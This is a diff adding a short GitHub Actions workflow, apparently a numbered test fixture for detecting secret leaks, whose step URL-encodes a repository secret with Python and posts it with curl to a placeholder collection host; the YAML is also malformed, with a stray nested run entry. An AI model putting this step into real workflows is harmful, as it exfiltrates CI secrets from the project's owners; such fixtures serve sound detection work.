@@ -1,0 +1,17 @@
+name: B31-python-os-env-bash
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: "${{ secrets.TEST_SECRET }}"
+
+    steps:
+      - run: |
+          - run: |
+          SECRET="${{ secrets.TEST_SECRET }}"
+          ENCODED=$(python3 -c "import urllib.parse, os; print(urllib.parse.quote(os.environ['SECRET']))")
+          curl --data "$ENCODED" https://example.invalid/collect
